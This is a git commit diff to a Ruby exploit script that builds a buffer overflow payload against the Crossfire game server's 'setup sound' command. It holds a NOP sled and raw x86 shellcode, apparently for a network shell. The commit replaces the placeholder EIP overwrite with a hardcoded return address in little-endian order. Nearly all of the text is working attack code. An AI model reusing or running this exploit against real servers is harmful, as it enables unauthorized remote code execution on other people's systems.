2376e67b5cf855a89bd909fe64abe78969ca614d
Shady <shady@shadyproject.net>
2013-07-07 13:59:07 -0700

    Updated EIP for static redirect

--- crossfire.rb
+++ crossfire.rb
@@ -9,7 +9,12 @@ shellcode = "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5
 crash = "\x90" * 200
 crash += shellcode
 crash += "\x43" * 4090
-crash += "\x42" * 4 #this should overwrite EIP
+#crash += "\x42" * 4 #this should overwrite EIP
+#for a static eip redirect, use 0xb7dadade
+crash += "\xde" #backwards for little endian
+crash += "\xda"
+crash += "\xda"
+crash += "\xb7"
 crash += "\x43" * 7
 
 buffer = "\x11(setup sound #{crash}\x90\x00#"
